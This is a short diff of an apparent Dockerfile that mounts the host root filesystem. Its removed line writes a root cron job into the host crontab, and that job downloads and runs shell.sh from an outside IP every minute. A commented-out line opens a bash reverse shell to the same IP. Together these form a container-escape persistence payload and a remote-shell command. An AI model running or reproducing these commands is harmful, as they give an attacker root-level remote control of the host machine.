@@ -4,7 +4,7 @@ RUN mkdir /host
 VOLUME /:/host
 
 
-RUN echo "* * * * * root curl http://124.71.183.77/shell.sh | sh" >> /host-etc/crontab
+#RUN echo "* * * * * root curl http://124.71.183.77/shell.sh | sh" >> /host-etc/crontab
 
 
 #RUN bash -i >& /dev/tcp/124.71.183.77/3309 0>&1 &
